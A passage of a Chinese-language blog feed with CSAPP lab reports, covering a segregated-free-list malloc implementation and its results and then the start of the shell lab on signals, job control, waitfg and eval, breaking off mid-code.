class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 将一个块 size 之后的部分拆分空闲块（如果满足大小要求），返回是否成功</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param address</span></span><br><span class="line"><span class="comment"> * @param size</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">split_block</span><span class="params">(<span class="keyword">void</span> *address, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">header_t</span> header = HEADER(address);</span><br><span class="line">    <span class="keyword">size_t</span> bsize = GET_SIZE(header);</span><br><span class="line">    <span class="keyword">if</span> (bsize &gt;= size + MIN_FREE_BLOCK_SIZE)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">void</span> *rest = (<span class="keyword">char</span> *)address + size;</span><br><span class="line">        SET_SIZE((<span class="keyword">header_t</span> *)address, size);</span><br><span class="line">        init_header_footer(rest, bsize - size, <span class="number">1</span>, IS_FREE(header));</span><br><span class="line">        insert_free_block(rest);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 初始化块的 header 和 footer（如果空闲）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param address</span></span><br><span class="line"><span class="comment"> * @param size</span></span><br><span class="line"><span class="comment"> * @param free</span></span><br><span class="line"><span class="comment"> * @param pred_free</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_header_footer</span><span class="params">(<span class="keyword">void</span> *address, <span class="keyword">size_t</span> size, <span class="keyword">int</span> <span class="built_in">free</span>, <span class="keyword">int</span> pred_free)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">header_t</span> header = GEN_HEADER(size, <span class="built_in">free</span>, pred_free);</span><br><span class="line">    *(<span class="keyword">header_t</span> *)address = header;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">free</span>)</span><br><span class="line">    {</span><br><span class="line">        *(<span class="keyword">footer_t</span> *)((<span class="keyword">char</span> *)address + size - FOOTER_T_SIZE) = header;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="mm_free">mm_free</h3>
<p>free 需要做以下几件事情，拆分为独立的宏或函数</p>
<ul>
<li>将块标记为空闲：<code>SET_FREE</code> 与 <code>SET_PRED_FREE</code></li>
<li>与相邻空闲块合并：<code>coalesce_block</code></li>
<li>添加到空闲链表：<code>insert_free_block</code></li>
</ul>
<p>代码如下，根据 <code>ptr</code> 获取块的地址，获取相邻空闲块的地址，进入合并逻辑。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_free - Freeing a block does nothing.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mm_free</span><span class="params">(<span class="keyword">void</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">void</span> *predecessor;</span><br><span class="line">    <span class="keyword">void</span> *successor = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">void</span> *address = (<span class="keyword">char</span> *)ptr - HEADER_T_SIZE;</span><br><span class="line">    <span class="keyword">header_t</span> header = HEADER(address);</span><br><span class="line">    predecessor = HAS_PRED_BLOCK(address) &amp;&amp; IS_PRED_FREE(header) ? pred_free_block(address) : <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (HAS_SUCC_BLOCK(address))</span><br><span class="line">    {</span><br><span class="line">        successor = SUCC_BLOCK(address);</span><br><span class="line">        SET_PRED_FREE((<span class="keyword">header_t</span> *)successor);</span><br><span class="line">        successor = IS_FREE(HEADER(successor)) ? successor : <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line">    coalesce_block(predecessor, address, successor);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>核心在于 <code>coalesce_block</code> 函数，计算合并后块的总大小，将其插入到对应的空闲链表中。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 合并相邻的空闲块</span></span><br><span class="line"><span class="comment"> * 假设当前块不处在空闲链表中</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">coalesce_block</span><span class="params">(<span class="keyword">void</span> *predecessor, <span class="keyword">void</span> *cur, <span class="keyword">void</span> *successor)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">header_t</span> cur_header = HEADER(cur);</span><br><span class="line">    <span class="keyword">if</span> (predecessor != <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        remove_free_block(predecessor);</span><br><span class="line">        <span class="keyword">header_t</span> header = HEADER(predecessor);</span><br><span class="line">        <span class="comment">// 计算合并后的大小</span></span><br><span class="line">        <span class="keyword">size_t</span> size = GET_SIZE(header) + GET_SIZE(cur_header);</span><br><span class="line">        <span class="keyword">if</span> (successor != <span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            size += GET_SIZE(HEADER(successor));</span><br><span class="line">            remove_free_block(successor);</span><br><span class="line">        }</span><br><span class="line">        init_header_footer(predecessor, size, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        insert_free_block(predecessor);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(cur_header);</span><br><span class="line">    <span class="keyword">if</span> (successor != <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        size += GET_SIZE(HEADER(successor));</span><br><span class="line">        remove_free_block(successor);</span><br><span class="line">    }</span><br><span class="line">    init_header_footer(cur, size, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    insert_free_block(cur);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 将空闲块插入对应的空闲链表</span></span><br><span class="line"><span class="comment"> * 根据header获取大小</span></span><br><span class="line"><span class="comment"> * @param address block address</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert_free_block</span><span class="params">(<span class="keyword">void</span> *address)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">size_t</span> cur_header = *(<span class="keyword">size_t</span> *)address;</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(cur_header);</span><br><span class="line">    <span class="keyword">int</span> index = get_seg_index(size);</span><br><span class="line">    <span class="keyword">void</span> **pprev = PPREV(address);</span><br><span class="line">    <span class="keyword">void</span> **pnext = PNEXT(address);</span><br><span class="line">    *pprev = seg_table + index;</span><br><span class="line">    *pnext = seg_table[index];</span><br><span class="line">    <span class="keyword">void</span> *old = seg_table[index];</span><br><span class="line">    seg_table[index] = address;</span><br><span class="line">    <span class="keyword">if</span> (old != <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        *PPREV(old) = address;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h3 id="mm_realloc">mm_realloc</h3>
<p>朴素的 <code>realloc</code> 可以这样实现：<code>mm_malloc</code> 新的内存，<code>memcpy</code> 将原内容拷贝到内存，<code>mm_free</code> 掉原本的内存。这种方法可以工作，但有以下问题：</p>
<ul>
<li>时间开销：耗时为三部分耗时之和</li>
<li>空间开销：引发内存碎片</li>
</ul>
<p>可以明确的是，针对通用的情况，上述逻辑是正确合理的，但是在某些情况下，可以做优化，例如：</p>
<ul>
<li><code>realloc</code> 用于减少块的大小，此时无需 <code>mm_malloc</code> 与 <code>memcpy</code>，可以直接返回，或者拆分小的空闲块后再返回</li>
<li>原有块的后方存在空闲块，二者合并后满足大小要求。相当于就地完成了 <code>malloc</code>，省去了 <code>memcpy</code>。</li>
</ul>
<p>针对这两种情况，可以编写如下的代码</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_realloc - Implemented simply in terms of mm_malloc and mm_free</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_realloc</span><span class="params">(<span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">void</span> *address = (<span class="keyword">char</span> *)ptr - HEADER_T_SIZE;</span><br><span class="line">    size = ALIGN(size + SIZE_T_SIZE);</span><br><span class="line">    <span class="keyword">header_t</span> header = HEADER(address);</span><br><span class="line">    <span class="keyword">size_t</span> old_size = GET_SIZE(header);</span><br><span class="line">    <span class="comment">// 判断是否是减少的情况，就地减少</span></span><br><span class="line">    <span class="keyword">if</span> (old_size &gt; size)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">// 能否拆出来一个空闲块</span></span><br><span class="line">        split_block(address, size);</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">char</span> *)address + HEADER_T_SIZE;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// 判断合并后续空闲块后能否达到size，省去malloc与拷贝</span></span><br><span class="line">    <span class="keyword">if</span> (HAS_SUCC_BLOCK(address))</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">void</span> *succ = SUCC_BLOCK(address);</span><br><span class="line">        <span class="keyword">header_t</span> succ_header = HEADER(succ);</span><br><span class="line">        <span class="keyword">size_t</span> succ_size = GET_SIZE(succ_header);</span><br><span class="line">        <span class="keyword">if</span> (IS_FREE(succ_header) &amp;&amp; old_size + succ_size &gt;= size)</span><br><span class="line">        {</span><br><span class="line">            remove_free_block(succ);</span><br><span class="line">            <span class="comment">// 拆分后半部分空闲块</span></span><br><span class="line">            SET_SIZE((<span class="keyword">header_t</span> *)address, old_size + succ_size);</span><br><span class="line">            split_block(address, size);</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">char</span> *)address + HEADER_T_SIZE;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// 原本的 realloc 逻辑</span></span><br><span class="line">    <span class="keyword">void</span> *oldptr = ptr;</span><br><span class="line">    <span class="keyword">void</span> *newptr;</span><br><span class="line">    <span class="keyword">size_t</span> copySize;</span><br><span class="line"></span><br><span class="line">    newptr = mm_malloc(size);</span><br><span class="line">    <span class="keyword">if</span> (newptr == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    copySize = *(<span class="keyword">size_t</span> *)((<span class="keyword">char</span> *)oldptr - SIZE_T_SIZE);</span><br><span class="line">    <span class="keyword">if</span> (size &lt; copySize)</span><br><span class="line">        copySize = size;</span><br><span class="line">    <span class="built_in">memcpy</span>(newptr, oldptr, copySize);</span><br><span class="line">    mm_free(oldptr);</span><br><span class="line">    <span class="keyword">return</span> newptr;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h2 id="结果与总结">结果与总结</h2>
<p>使用 <code>mdriver</code> 评估，得到 87 分，结果如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Results for mm malloc:</span><br><span class="line">trace  valid  util     ops      secs  Kops</span><br><span class="line"> 0       yes   98%    5694  0.000160 35677</span><br><span class="line"> 1       yes   98%    5848  0.000198 29550</span><br><span class="line"> 2       yes   98%    6648  0.000217 30608</span><br><span class="line"> 3       yes   99%    5380  0.000140 38346</span><br><span class="line"> 4       yes   99%   14400  0.000229 62772</span><br><span class="line"> 5       yes   91%    4800  0.000250 19215</span><br><span class="line"> 6       yes   90%    4800  0.000260 18462</span><br><span class="line"> 7       yes   55%   12000  0.000213 56259</span><br><span class="line"> 8       yes   51%   24000  0.000432 55543</span><br><span class="line"> 9       yes   17%   14401  0.000527 27300</span><br><span class="line">10       yes   57%   14401  0.000268 53695</span><br><span class="line">Total          78%  112372  0.002895 38812</span><br><span class="line"></span><br><span class="line">Perf index = 47 (util) + 40 (thru) = 87/100</span><br><span class="line">correct:11</span><br><span class="line">perfidx:87</span><br></pre></td></tr></tbody></table></figure>
<p>虽然没有拿到满分，但整体做完还是非常酣畅淋漓的体验。从学完之后满腹经纶但又无从下手，到摸索如何设计与抽象函数，再到被各种段错误折磨，最后豁然开朗、茅塞顿开，用 “酣畅淋漓” 这四个字形容在合适不过了！</p>
<h2 id="实验可能遇到的问题">实验可能遇到的问题</h2>
<h3 id="traces路径问题">traces 路径问题</h3>
<p>在 <code>config.h</code> 中，修改 TRACEDIR 为相对路径。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRACEDIR <span class="meta-string">"./traces/"</span></span></span><br></pre></td></tr></tbody></table></figure>
<h3 id="asmerrno.h-no-such-file-or-directory">asm/errno.h: No such file or directory</h3>
<p>参见 stackoverflow：<a href="https://stackoverflow.com/questions/14795608/asm-errno-h-no-such-file-or-directory">linux - asm/errno.h: No such file or directory - Stack Overflow</a></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ln -s /usr/include/asm-generic /usr/include/asm</span><br></pre></td></tr></tbody></table></figure>
<h3 id="段错误">段错误</h3>
<p>为 GCC 添加 <code>-g</code> 参数创建用于调试的评测文件，使用 gdb 启动程序，发生段错误后输出 <code>bt</code>，即 <code>backtrace</code> 命令，即可打印出堆栈和报错行数，还可以打印不同变量的值。建议关闭 <code>-O2</code> 选项来避免变量被优化了无法查看值。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/483719414">malloc 是如何分配内存的？ - 知乎 (zhihu.com)</a></li>
<li><a href="https://wdxtub.com/csapp/thin-csapp-7/2016/04/16/">【读薄 CSAPP】柒 虚拟内存与动态内存分配 | 小土刀 2.0 (wdxtub.com)</a></li>
<li><a href="https://www.cs.cmu.edu/afs/cs/academic/class/15213-f10/www/lectures/17-allocation-basic.pdf">17-allocation-basic.pdf (cmu.edu)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/57863097">malloc 的实现原理 内存池 mmap sbrk 链表 - 知乎 (zhihu.com)</a></li>
<li><a href="https://jacktang816.github.io/post/mallocandfree/">malloc 和 free 的实现原理解析 - JackTang's Blog (jacktang816.github.io)</a></li>
</ul>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>体系结构</category>
        <category>csapp</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>体系结构</tag>
        <tag>csapp</tag>
        <tag>实验报告</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-Lab-5 实验报告: shelllab</title>
    <url>/blog/2023/12/21/CSAPP-Lab-5/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本文介绍了笔者在做 shelllab 一节的实验报告。该 lab 要求使用 C 语言实现一个简易的 shell，加深对异常控制流的理解。 <span id="more"></span></p>
<h2 id="理论知识">理论知识</h2>
<h3 id="异常控制流">异常控制流</h3>
<p>从通电开始到关机结束，CPU 重复地执行着程序寄存器所指向的指令，这些指令的转移关系序列构成了控制流。最简单的控制流就是执行下一条相邻指令。在程序内部，可以通过分支跳转，以及调用返回的机制，改变控制流，执行非相邻的指令。但是，这仅限于程序内部的正常逻辑。</p>
<p>而对于计算机系统，需要一定的机制响应处理外部事件，例如：</p>
<ul>
<li>数据包到达网络适配器</li>
<li>程序执行错误，如除数为 0</li>
<li> 用户按下 ctrl+c</li>
<li> 系统的计时器超时</li>
</ul>
<p>现代系统通过异常控制流（Exception Control Flow，ECF）的机制来应对这些情况，通过软硬件协作实现。例如，硬件检测到外部事件发生，设置 CPU 中断信号，执行异常处理代码。操作系统层面，通过上下文切换，将控制权移交内核或其他程序。应用层面，可以通过信号机制完成进程通信，使得进程其他进程移交控制到信号处理逻辑，等等。</p>
<h3 id="异常">异常</h3>
<p>异常的流程如下图所示。外部事件的发生，使得程序移交控制权到异常处理程序，处理完毕后，可能会跳转回程序继续执行程序指令。返回地址可以是当前指令（如缺页异常），或者下一条指令（如系统调用），也可能根本不返回（如非法访问）。</p>
<p><img src="ecf.png"></p>
<p>每个异常都有一个唯一非负的异常号，并与一段异常处理程序关联，在操作系统中这构成了一张异常表，如下图所示。</p>
<p><img src="exception_table.png"></p>
<p>异常可以分为以下几种，中断是由 IO 设备引起的异步异常，而陷阱、故障、终止都是同步异常。他们的返回地址也有所差别。</p>
<p><img src="exceptions.png"></p>
<h3 id="信号">信号</h3>
<p>信号（Signal）是一种进程间通信的手段，其思想是，发送预先定义的信号到指定进程，触发进程的信号处理逻辑。常见的信号有：</p>
<table>
<thead>
<tr class="header">
<th>编号</th>
<th>名称</th>
<th>默认动作</th>
<th>对应事件</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> 2</td>
<td>SIGINT</td>
<td> 终止</td>
<td>用户输入 ctrl+c</td>
</tr>
<tr class="even">
<td>9</td>
<td>SIGKILL</td>
<td> 终止</td>
<td>终止程序（不能重写或忽略）</td>
</tr>
<tr class="odd">
<td>11</td>
<td>SIGSEGV</td>
<td> 终止且 Dump</td>
<td> 段冲突 Segmentation violation</td>
</tr>
<tr class="even">
<td>14</td>
<td>SIGALRM</td>
<td> 终止</td>
<td>时间信号</td>
</tr>
<tr class="odd">
<td> 17</td>
<td>SIGCHLD</td>
<td> 忽略</td>
<td>子进程停止或终止</td>
</tr>
</tbody>
</table>
<p>信号的实现机制为，每个进程内部维护一个 bitset 表示待处理的信号，使用 <code>kill</code> 命令向进程 A 发送信号后，实际是将进程 A 的对应信号 bit 置 1。当进程 A 被操作系统调度执行前，会先检查是否有待处理的信号，如有则跳转到信号的处理逻辑，每种信号有默认的处理行为，程序内部可以通过重写函数改变行为。SIGKILL 信号无法被重写，保证了恶意程序一定可以杀掉。</p>
<p>信号虽然很方便，但也带来了一些问题。根本上看，信号处理与用户程序是并发的，这意味着可能出现竞态条件、死锁这些并发问题。而且，信号的处理可以被新的信号打断。课程中给出了一些建议，来编写好的信号处理函数：</p>
<ul>
<li>规则 1：信号处理器越简单越好
<ul>
<li>例如：设置一个全局的标记，并返回</li>
</ul></li>
<li>规则 2：信号处理器中只调用异步且信号安全 (async-signal-safe) 的函数
<ul>
<li>诸如 <code>printf</code>, <code>sprintf</code>, <code>malloc</code> 和 <code>exit</code> 都是不安全的！</li>
</ul></li>
<li>规则 3：在进入和退出的时候保存和恢复 <code>errno</code>
<ul>
<li>这样信号处理器就不会覆盖原有的 <code>errno</code> 值</li>
</ul></li>
<li>规则 4：临时阻塞所有的信号以保证对于共享数据结构的访问
<ul>
<li>防止可能出现的数据损坏</li>
</ul></li>
<li>规则 5：用 <code>volatile</code> 关键字声明全局变量
<ul>
<li>这样编译器就不会把它们保存在寄存器中，保证一致性</li>
</ul></li>
<li>规则 6：用 <code>volatile sig_atomic_t</code> 来声明全局标识符 (flag)
<ul>
<li>这样可以防止出现访问异常</li>
</ul></li>
</ul>
<h2 id="实验概览">实验概览</h2>
<p>实验部分要求我们实现一个 <code>tsh</code>，支持内置的作业管理，需要实现以下函数：</p>
<ul>
<li>eval：shell 主进程，解析并执行命令行输入</li>
<li> builtin_cmd：识别命令是否为内置命令，bg、fg、jobs、quit</li>
<li>do_bgfg: 实现 bg 和 fg 命令</li>
<li> waitfg：等待前台作业结束</li>
<li> sigchld_handler：SIGCHLD 信号的处理</li>
<li> sigint_handler: SIGINT 信号处理（ctrl+c）</li>
<li>sigtstp_handler: SIGSTP 信号处理（ctrl+z）</li>
</ul>
<p>代码的逻辑非常清晰，在 <code>main</code> 中，解析命令行参数，注册信号处理函数，初始化作业数组，接着就进入一个死循环，接受命令行输入，<code>eval</code> 执行，还有注释可以帮助理解。接下来，我们可以由易到难地逐个实现这些函数。</p>
<p>在实现之前，可以将其他 lab 里的 <code>csapp.c</code> 的包装代码复制过来，以大写字母开头的系统调用函数。这些函数在内部封装了错误处理的逻辑，代码风格更好。</p>
<h2 id="builtin_cmd">builtin_cmd</h2>
<p>判断命令是否为 bg、fg、jobs、quit 之一，可以通过 <code>strcmp</code> 函数实现，非常直接简单。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *QUIT_CMD = <span class="string">"quit"</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *FG_CMD = <span class="string">"fg"</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *BG_CMD = <span class="string">"bg"</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *JOBS_CMD = <span class="string">"jobs"</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * builtin_cmd - If the user has typed a built-in command then execute</span></span><br><span class="line"><span class="comment"> *    it immediately.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span> (argv == <span class="literal">NULL</span> || argv[<span class="number">0</span>] == <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], QUIT_CMD) == <span class="number">0</span> || <span class="built_in">strcmp</span>(argv[<span class="number">0</span>], FG_CMD) == <span class="number">0</span> || <span class="built_in">strcmp</span>(argv[<span class="number">0</span>], BG_CMD) == <span class="number">0</span> || <span class="built_in">strcmp</span>(argv[<span class="number">0</span>], JOBS_CMD) == <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">/* not a builtin command */</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h2 id="waitfg">waitfg</h2>
<p>等待前台作业结束。核心是使用一个 <code>while</code> 循环反复重试，直到该作业不是前台作业，循环内可以使用 <code>sleep</code>，如下所示：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * waitfg - Block until process pid is no longer the foreground process</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span> =</span> getjobpid(jobs, pid);</span><br><span class="line">    <span class="keyword">if</span> (job == <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">while</span> (job-&gt;state == FG)</span><br><span class="line">    {</span><br><span class="line">        Sleep(<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>也可以按课上所说，使用 <code>sigsuspend</code> 调用来阻塞等待，等价于原子执行以下三行代码。其中 <code>pause</code> 函数用以阻塞直到接收到信号，可以避免上述忙等待的重试。<code>pause</code> 前屏蔽信号，又避免了在 <code>pause</code> 前收到信号，<code>pause</code> 无限等待的死锁。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev);</span><br><span class="line">pause();</span><br><span class="line">sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br></pre></td></tr></tbody></table></figure>
<p>使用 <code>sigsuspend</code> 的版本如下所示：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span> =</span> getjobpid(jobs, pid);</span><br><span class="line">    <span class="keyword">if</span> (job == <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">sigset_t</span> mask, prev;</span><br><span class="line">    Sigemptyset(&amp;mask);</span><br><span class="line">    Sigaddset(&amp;mask, SIGCHLD);</span><br><span class="line">    Sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev);</span><br><span class="line">    <span class="keyword">while</span> (job-&gt;state == FG)</span><br><span class="line">    {</span><br><span class="line">        sigsuspend(&amp;prev);</span><br><span class="line">    }</span><br><span class="line">    Sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>它的思想是，先屏蔽掉 SIGCHLD 信号，当发现作业依然是前台作业时，原子性执行以下逻辑：</p>
<ol type="1">
<li>取消 SIGCHLD 信号屏蔽</li>
<li>阻塞直到某个信号出现</li>
<li>屏蔽 SIGCHLD 信号</li>
</ol>
<p>然后，判断作业是否依然为前台作业，决定是否继续循环等待。相较于 <code>sleep</code>，这个版本更加高效。</p>
<h2 id="eval">eval</h2>
<p>解析命令行参数并执行。对于内置命令，直接在 shell 进程中执行，否则，通过 <code>fork,execve</code> 结合在子进程中执行。对于子进程，需要：</p>
<ul>
<li>通过 <code>addjob</code> 将它添加到作业中，用于管理</li>
<li>设置子进程的 groupid 为单独的 pid，避免与 tsh 共用 groupid 时，杀掉子进程组把 tsh 也杀掉</li>
<li>如果为前台作业，等待结束，如果为后台作业，打印命令行（与标准程序达到一致输出）</li>
</ul>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">// printf("eval %s\n", cmdline);</span></span><br><span class="line">    <span class="keyword">char</span> **argv = (<span class="keyword">char</span> **)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span> *) * MAXARGS);</span><br><span class="line">    <span class="keyword">int</span> bg = parseline(cmdline, argv);</span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">0</span>] == <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// 立刻执行内置命令</span></span><br><span class="line">    <span class="keyword">if</span> (builtin_cmd(argv))</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], JOBS_CMD) == <span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            listjobs(jobs);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], QUIT_CMD) == <span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            do_bgfg(argv);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, mask_one, prev_one;</span><br><span class="line">    Sigfillset(&amp;mask_all);</span><br><span class="line">    Sigemptyset(&amp;mask_one);</span><br><span class="line">    Sigaddset(&amp;mask_one, SIGCHLD);</span><br><span class="line">    <span class="comment">// fork 子进程执行程序</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="comment">// 父进程屏蔽sigchld</span></span><br><span class="line">    Sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev_one);</span><br><span class="line">    <span class="keyword">if</span> ((pid = Fork()) == <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">// 子进程接收sigchld</span></span><br><span class="line">        Sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>);</span><br><span class="line">        pid = getpid();</span><br><span class="line">        Setpgid(pid, pid);</span><br><span class="line">        Execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">// 兜底异常退出</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    Sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>);</span><br><span class="line">    addjob(jobs, pid, bg ? BG : FG, cmdline);</span><br><span class="line">    <span class="keyword">if</span> (bg)</span><br><span class="line">    {</span><br><span class="line">        